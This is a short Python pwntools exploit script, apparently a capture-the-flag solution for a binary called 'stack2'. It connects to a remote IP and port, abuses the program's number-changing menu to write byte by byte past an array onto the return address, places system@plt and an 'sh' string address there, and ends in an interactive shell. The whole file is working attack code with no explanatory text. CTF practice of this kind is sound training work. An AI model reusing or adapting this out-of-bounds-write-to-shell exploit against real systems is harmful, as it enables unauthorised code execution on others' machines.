from pwn import *

# p = process("./stack2")
# gdb.attach(p)
p = remote("111.200.241.244", "55067")

hackhere = [0x9b, 0x85, 0x04, 0x08]     # 0x0804859b
write_offset = 0x84
system_addr = [0x50, 0x84, 0x04, 0x08]  # 0x08048450
sh_addr = [0x87, 0x89, 0x04, 0x08]      # 0x08048987

def write_addr(offset, value):
    p.sendline("3")
    p.recvuntil("which number to change:\n")
    p.sendline(str(offset))
    p.recvuntil("new number:\n")
    p.sendline(str(value))
    p.recvuntil("5. exit\n")

p.sendlineafter("How many numbers you have:", "1")
p.sendlineafter("Give me your numbers", "1")
p.recvuntil("5. exit")
log.success('1')

for i in range(4):
    print(int(system_addr[i]))

# sys_addr
for i in range(4):
    write_addr(int(write_offset + i), int(system_addr[i]))


(write_offset) = int(write_offset + 8)
print(hex(write_offset))

# sh_addr

for i in range(4):
    print(int(sh_addr[i]))

for i in range(4):
    write_addr(int(write_offset + i), int(sh_addr[i]))

log.success('2')

p.sendline("5")

# p.sendlineafter("5. exit", "5")
# p.recvuntil("5. exit")

p.interactive()
